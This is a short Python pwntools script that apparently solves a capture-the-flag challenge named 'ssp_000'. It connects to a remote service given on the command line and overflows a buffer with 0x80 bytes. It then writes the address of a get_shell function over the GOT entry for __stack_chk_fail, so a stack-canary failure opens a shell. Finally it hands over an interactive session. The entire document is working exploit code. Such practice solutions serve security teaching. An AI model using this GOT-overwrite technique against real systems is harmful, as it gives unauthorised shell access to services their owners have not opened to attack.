#! /usr/bin/env python3

import pwn
import sys

pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/ssp_000")


payload = b"A" * 0x80

r.send(payload)

payload = str(e.got["__stack_chk_fail"])

r.sendlineafter(b"Addr : ", payload)

payload = str(e.symbols["get_shell"])

r.sendlineafter(b"Value : ", payload)

r.interactive()